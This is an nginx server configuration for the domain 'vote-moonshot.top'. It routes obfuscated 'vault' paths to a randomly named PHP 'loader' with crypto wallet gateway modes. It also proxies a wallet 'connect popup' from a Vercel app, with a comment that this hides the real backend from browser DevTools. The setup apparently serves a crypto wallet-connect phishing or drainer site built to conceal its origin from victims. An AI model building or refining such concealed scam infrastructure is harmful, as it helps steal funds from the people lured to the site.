# /etc/nginx/sites-available/mysite
# Site root = /var/www/mysite/public (HTML + loader.php)
# Do NOT use snippets/fastcgi-php.conf — it breaks SCRIPT_FILENAME.

server {
    listen 80;
    listen [::]:80;
    server_name vote-moonshot.top www.vote-moonshot.top;

    root /var/www/lol/public;
    index index.html;

    # Match script_path in loader.php $cfg (no .php in URL)
    location = /vault38472 {
        include fastcgi_params;
        fastcgi_pass unix:/run/php/php8.4-fpm.sock;
        fastcgi_param SCRIPT_FILENAME /var/www/lol/public/5joud6Jn.php;
    }

    location = /vault38472.php {
        include fastcgi_params;
        fastcgi_pass unix:/run/php/php8.4-fpm.sock;
        fastcgi_param SCRIPT_FILENAME /var/www/lol/public/5joud6Jn.php;
    }

    location = /vault38472-rpc {
        include fastcgi_params;
        fastcgi_pass unix:/run/php/php8.4-fpm.sock;
        fastcgi_param SCRIPT_FILENAME /var/www/lol/public/5joud6Jn.php;
        fastcgi_param WALLET_GATEWAY_MODE rpc;
    }

    location = /vault38472-price {
        include fastcgi_params;
        fastcgi_pass unix:/run/php/php8.4-fpm.sock;
        fastcgi_param SCRIPT_FILENAME /var/www/lol/public/5joud6Jn.php;
        fastcgi_param WALLET_GATEWAY_MODE price;
    }

    # Same-origin connect popup (hides Vercel /profile in DevTools)
    location ^~ /vault38472-popup/ {
        proxy_pass https://fuzzy-octo-guacamole-delta.vercel.app/profile/;
        proxy_ssl_server_name on;
        proxy_set_header Host fuzzy-octo-guacamole-delta.vercel.app;
    }

    location = /vault38472-popup {
        return 301 /vault38472-popup/;
    }

    location ~ \.php$ {
        deny all;
    }

    location ~ /\. {
        deny all;
    }
}

# After certbot: copy location blocks into the listen 443 ssl { } server.
